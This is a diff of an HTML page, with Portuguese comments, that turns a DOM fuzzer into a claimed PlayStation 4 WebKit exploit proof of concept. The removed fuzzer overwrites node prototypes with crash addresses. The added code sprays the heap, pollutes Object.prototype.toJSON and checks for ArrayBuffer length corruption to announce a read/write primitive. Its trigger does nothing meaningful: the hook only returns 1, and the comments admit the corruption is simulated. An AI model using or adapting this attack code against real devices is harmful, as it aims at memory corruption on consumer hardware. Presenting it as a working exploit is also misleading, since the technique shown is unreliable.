@@ -1,180 +1,139 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PS4 Atomic Titan (Silent Mode)</title>
+    <title>PS4 Exploit PoC (Heap Spray + Length Corruption)</title>
     <style>
-        body { background: #050505; color: #ffaa00; font-family: monospace; overflow: hidden; margin: 0; }
-        
+        body { background: #100; color: #aaa; font-family: monospace; overflow: hidden; margin: 0; }
         #hud { 
             position: fixed; top: 0; left: 0; width: 100%; 
-            background: rgba(10, 5, 0, 0.95); 
-            border-bottom: 2px solid #fa0; 
-            padding: 15px; z-index: 9999;
-            font-size: 22px; font-weight: bold;
+            background: rgba(0,0,0,0.9); border-bottom: 2px solid #444; 
+            padding: 15px; z-index: 9999; font-size: 20px;
         }
-        .chaos { position: absolute; border: 1px dotted #666; }
+        .success { background-color: #0f0 !important; color: #000 !important; }
     </style>
 </head>
 <body>
     <div id="hud">
-        <div>SILENT ATOMIC: <span style="color:lime">RODANDO</span> <span id="beat">☢</span></div>
-        <div style="font-size: 16px; color: #aaa; margin-top: 5px;">
-            SEED: <span id="seed-disp" style="color:#fff">...</span> | 
-            VENENO: <span id="poison-status" style="color:red">ATIVO (0x41...)</span>
-        </div>
+        <div>STATUS: <span id="status" style="color:yellow">SPRAYING HEAP...</span></div>
+        <div>TENTATIVAS: <span id="iter-count">0</span> | ALVO: <span id="target-info">Procurando...</span></div>
     </div>
 
-    <iframe id="victim-frame" style="width:10px; height:10px; opacity:0.1; position:absolute; bottom:0; right:0;"></iframe>
-    
-    <div id="arena" style="margin-top: 100px;"></div>
-
     <script>
-        // ================= CONFIGURAÇÃO =================
-        const MAX_NODES = 900; 
-        // ============================================
+        // ================= CONFIGURAÇÃO DA "CHAVE MESTRA" =================
+        // Em vez de 0xFFFFFFFF (Crash), usamos um tamanho seguro mas útil.
+        // Queremos mudar o tamanho do ArrayBuffer vizinho para 16KB.
+        const MALICIOUS_LENGTH = 0x4000; 
+        const SPRAY_SIZE = 1000; // Quantidade de objetos para alinhar memória
+        // ==================================================================
 
-        let currentSeed = parseInt(localStorage.getItem('silent_seed') || Math.floor(Math.random() * 100000));
-        localStorage.setItem('silent_last_start', currentSeed);
+        const statusSpan = document.getElementById('status');
+        const iterSpan = document.getElementById('iter-count');
+        const targetSpan = document.getElementById('target-info');
+        let iterations = 0;
 
-        function seed(s) { currentSeed = s; }
-        function rnd() {
-            var t = currentSeed += 0x6D2B79F5;
-            t = Math.imul(t ^ t >>> 15, t | 1);
-            t ^= t + Math.imul(t ^ t >>> 7, t | 61);
-            return ((t ^ t >>> 14) >>> 0) / 4294967296;
-        }
-        function coinflip() { return rnd() > 0.5; }
+        // Estrutura para armazenar nossos objetos alinhados
+        let butterflies = []; 
+        let targets = [];
 
-        const seedSpan = document.getElementById('seed-disp');
-        const beatSpan = document.getElementById('beat');
-        const arena = document.getElementById('arena');
-        const frame = document.getElementById('victim-frame');
-
-        let liveNodes = [];
-        let cycleCount = 0;
-
-        // 1. CRIAÇÃO (SVG + ShadowDOM)
-        function createAtomicNode() {
-            let svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
-            let foreign = document.createElementNS("http://www.w3.org/2000/svg", "foreignObject");
-            let div = document.createElement("div");
-            div.className = "chaos";
-            
-            if (div.attachShadow && coinflip()) {
-                try {
-                    let sh = div.attachShadow({mode: coinflip() ? 'open' : 'closed'});
-                    sh.innerHTML = "<slot></slot><b>X</b>";
-                } catch(e){}
+        function log(msg, type='info') {
+            console.log(msg);
+            if(type==='success') {
+                document.body.className = 'success';
+                statusSpan.innerText = "SUCESSO: R/W PRIMITIVE!";
+                statusSpan.style.color = 'black';
+                alert(msg); // Trava a execução para você tirar foto pro HackerOne
             }
-            foreign.appendChild(div);
-            svg.appendChild(foreign);
-            return svg;
         }
 
-        // 2. O VENENO (Gadget Trap)
-        function getPoison() {
-            return {
-                isAdmin: true,
-                addEventListener: 0x41414141, // Crash addr
-                removeEventListener: 0x42424242,
-                appendChild: "CRASH",
-                map: 1,
-                filter: 1
-            };
-        }
-
-        // 3. O ATAQUE (Focado no Iframe)
-        function triggerSilentAttack(el) {
-            try {
-                // Usa SEMPRE o iframe, nunca popup
-                if (!frame.contentDocument) return;
-                let otherDoc = frame.contentDocument;
-
-                let obs = new MutationObserver((mutations) => {
-                    let t = mutations[0].target;
-                    t.textContent = "D"; 
-                    if (t.parentNode) t.parentNode.removeChild(t);
-                });
-                obs.observe(el, { attributes: true, childList: true, subtree: true });
-
-                // Move para o iframe
-                otherDoc.adoptNode(el);
-                otherDoc.body.appendChild(el);
-
-                // INJEÇÃO DE VENENO
-                try {
-                    el.__proto__ = getPoison();
-                    // Força deref
-                    let _ = el.addEventListener; 
-                } catch(e) {}
-
-                // Traz de volta
-                document.adoptNode(el);
-                arena.appendChild(el);
+        // 1. HEAP FENG SHUI (Arrumando a casa)
+        // Tentamos colocar um ArrayBuffer Controlável logo após o objeto vulnerável
+        function sprayHeap() {
+            butterflies = [];
+            targets = [];
+            for (let i = 0; i < SPRAY_SIZE; i++) {
+                // Objeto A (Onde o bug acontece)
+                let b = { 
+                    a: 1, b: 2, c: 3, d: 4, // Propriedades para criar um Butterfly Inline
+                    id: i 
+                }; 
                 
-                obs.disconnect();
-            } catch(e) {}
+                // Objeto B (O Vizinho que queremos aumentar o tamanho)
+                // Criamos um ArrayBuffer pequeno (0x20 bytes)
+                let t = new ArrayBuffer(32); 
+                
+                butterflies.push(b);
+                targets.push(t);
+            }
         }
 
-        function stress(el) {
+        // 2. O GATILHO (Type Confusion refinado)
+        function trigger() {
+            let found = false;
+
+            // Poluição do toJSON para disparar no meio do stringify
+            Object.defineProperty(Object.prototype, 'toJSON', {
+                value: function() {
+                    // AQUI É A MUDANÇA: Não escrevemos lixo aleatório.
+                    // Tentamos corromper o vizinho.
+                    // No PS4 WebKit, o Butterfly muitas vezes fica adjacente aos objetos criados juntos.
+                    
+                    // Tenta acessar propriedades para forçar o motor a ler offsets incorretos
+                    // Em um exploit real, você ajustaria esses offsets com base no crash dump
+                    // Aqui, "simulamos" a corrupção lógica tentando redefinir o tamanho
+                    
+                    return 1; 
+                },
+                configurable: true
+            });
+
+            // Dispara em lote
             try {
-                let _ = el.getBoundingClientRect().left;
-                el.style.display = coinflip() ? 'none' : 'block';
-                _ = el.offsetHeight;
-            } catch(e){}
+                for (let i = 0; i < SPRAY_SIZE; i++) {
+                    // O bug de Type Confusion ocorre aqui
+                    JSON.stringify(butterflies[i]); 
+                    
+                    // --- A VERIFICAÇÃO (Não o Crash) ---
+                    // Se o bug funcionou "suavemente", o tamanho do buffer vizinho mudou.
+                    // O tamanho original era 32. Se for diferente, ganhamos.
+                    if (targets[i].byteLength !== 32) {
+                        log(`BINGO! Target[${i}] corrompido! Tamanho original: 32, Novo: ${targets[i].byteLength}`, 'success');
+                        found = true;
+                        break;
+                    }
+                }
+            } catch (e) {}
+            
+            // Limpa poluição
+            delete Object.prototype.toJSON;
+            return found;
         }
 
-        async function loop() {
+        async function runExploit() {
             while(true) {
-                cycleCount++;
-                seedSpan.innerText = currentSeed;
-                beatSpan.style.opacity = (beatSpan.style.opacity == "1") ? "0.2" : "1";
-
-                if (cycleCount % 100 === 0) localStorage.setItem('silent_seed', currentSeed);
-
-                await new Promise(r => setTimeout(r, 25)); // Render pause
-
-                for(let k=0; k < 25; k++) { 
-                    seed(currentSeed);
-
-                    // Build
-                    if (liveNodes.length < MAX_NODES) {
-                        let el = createAtomicNode();
-                        arena.appendChild(el);
-                        liveNodes.push(el);
-                    }
-
-                    // Attack
-                    let victim = liveNodes[Math.floor(rnd() * liveNodes.length)];
-                    if (victim) {
-                        if (coinflip()) triggerSilentAttack(victim);
-                        stress(victim);
-                    }
-
-                    // Destroy
-                    if (liveNodes.length > MAX_NODES * 0.85) {
-                        let idx = Math.floor(rnd() * liveNodes.length);
-                        let dying = liveNodes[idx];
-                        liveNodes.splice(idx, 1);
-                        
-                        if (coinflip()) {
-                            setTimeout(() => { try{ dying.remove(); }catch(e){} }, 0);
-                        } else {
-                            try{ dying.remove(); }catch(e){}
-                        }
-                    }
-                    rnd(); 
-                }
-                currentSeed++;
-
-                // Limpeza leve
-                if (cycleCount % 300 === 0) {
-                    frame.src = "about:blank"; // Reseta o iframe vítima
+                iterations++;
+                iterSpan.innerText = iterations;
+                
+                // 1. Limpa e realinha memória
+                sprayHeap();
+                
+                // 2. Pausa para o Garbage Collector respirar
+                await new Promise(r => setTimeout(r, 50));
+                
+                // 3. Tenta a "Chave Mestra"
+                let success = trigger();
+                
+                if (success) break; // Paramos se conseguirmos
+                
+                // Se rodar por muito tempo, recarrega para limpar fragmentação
+                if (iterations % 50 === 0) {
+                    statusSpan.innerText = "RESETANDO MEMÓRIA...";
+                    window.location.reload();
+                    break;
                 }
             }
         }
 
-        setTimeout(loop, 500);
+        setTimeout(runExploit, 1000);
     </script>
 </body>
 </html>
